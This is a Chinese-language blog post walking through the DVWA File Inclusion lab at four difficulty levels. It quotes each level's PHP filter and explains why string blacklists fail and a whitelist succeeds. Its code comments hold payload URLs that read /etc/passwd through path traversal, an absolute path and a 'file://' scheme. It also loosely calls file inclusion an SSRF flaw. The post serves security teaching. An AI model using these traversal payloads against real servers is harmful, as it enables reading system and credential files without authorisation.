---
title: "File Inclusion"
date: 2020-04-13
description: "講解 DVWA 文件包含漏洞從 Low 到 Impossible 四檔源碼的差異,分析 str_replace 過濾常見協議與上級目錄符號的不足與 fnmatch 文件前綴通配的侷限,指出基於字符串模式匹配的黑名單幾乎都存在繞過手段,最後給出基於白名單強匹配的唯一安全方案。"
tags: ["安全"]
draft: true
cover:
  image: "images/covers/20200413-File-Inclusion-1327.svg"
  alt: ""
  hidden: false
aliases: ["/posts/20200413048rkq/"]
language: "zh-tw"
---

DVWA File Inclusion 過關秘籍

是一種`SSRF`漏洞

### Low

```PHP
// 非常單純, 隨便讀取
// http://192.168.32.114/vulnerabilities/fi/?page=../../../../../../etc/passwd
// The page we wish to display
$file = $_GET[ 'page' ];
```

### Medium

```PHP
// The page we wish to display
$file = $_GET[ 'page' ];

// 過濾一部分字符
// 不允許 HTTP,HTTPS 協議
// 利用目錄結構讀取也不行

// 然而沒有過濾全
// http://192.168.32.114/vulnerabilities/fi/?page=/etc/passwd

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

### High

```PHP
// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
// 對$file 字符串做匹配
// 只能匹配 file* 的文件路徑
// 還有 include.php 文件路徑

// 這個過濾還是八星
// 利用`本地文件傳輸協議`
// http://192.168.32.114/vulnerabilities/fi/?page=file:///etc/passwd

// 或者這樣
// http://192.168.32.114/vulnerabilities/fi/?page=file123123/../../../../../../etc/passwd

if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```

### Impossible

```PHP
// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
// 強匹配
// 從程序員的角度來說這種代碼的維護性極差
// 從安全的角度上來說這是最安全的方案
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```
